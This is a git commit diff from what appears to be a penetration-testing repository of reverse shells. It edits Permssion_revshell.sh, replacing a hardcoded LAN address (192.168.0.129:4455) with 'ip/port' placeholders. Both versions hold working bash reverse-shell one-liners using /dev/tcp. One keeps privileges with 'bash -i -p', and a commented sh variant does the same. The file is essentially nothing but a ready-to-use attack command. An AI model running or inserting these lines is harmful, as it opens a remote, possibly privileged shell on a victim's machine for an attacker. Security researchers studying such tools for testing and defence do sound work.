497c1037d60b7c4b0cbe5c6fca7b0b7e27513610
SebSecRepos <130188315+SebSecRepos@users.noreply.github.com>
2023-12-29 11:50:13 -0300

    Update Permssion_revshell.sh

--- Linux/reverse_shells/Permssion_revshell.sh
+++ Linux/reverse_shells/Permssion_revshell.sh
@@ -1,8 +1,7 @@
 #!/bin/bash
 
-#Contemplate permisions in reverse shells
-
-/bin/bash -c '/bin/bash -i -p >& /dev/tcp/192.168.0.129/4455 0>&1' &
+# Getting user permisions in reverse shells
+/bin/bash -c '/bin/bash -i -p >& /dev/tcp/ip/port 0>&1' &
 
 #!/bin/sh
-#/bin/sh -c '/bin/sh -i >& /dev/tcp/192.168.0.129/4455 0>&1' &
+#/bin/sh -c '/bin/sh -i >& /dev/tcp/ip/port 0>&1' &
